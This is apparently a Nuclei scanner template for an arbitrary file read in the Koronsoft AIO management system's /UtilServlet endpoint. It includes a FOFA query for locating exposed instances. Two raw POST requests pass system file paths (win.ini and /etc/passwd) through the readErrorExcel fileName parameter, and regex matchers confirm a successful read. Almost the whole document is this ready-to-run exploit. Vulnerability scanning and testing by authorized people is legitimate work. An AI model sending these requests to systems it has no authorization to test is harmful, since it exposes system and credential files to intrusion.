id: koronsoft-aio-UtilServlet-fileread

info:
  name: 科荣 AIO 管理系统 UtilServlet - fileread
  author: leadlife
  severity: high
  description: todo
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: icon_hash="-638292089" || body="changeAccount('8000')"
  tags: koronsoft,fileread,aio

http:
  - raw:
      - |
        POST /UtilServlet HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        operation=readErrorExcel&fileName=c:\windows/win.ini

      - |
        POST /UtilServlet HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        operation=readErrorExcel&fileName=/etc/passwd

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200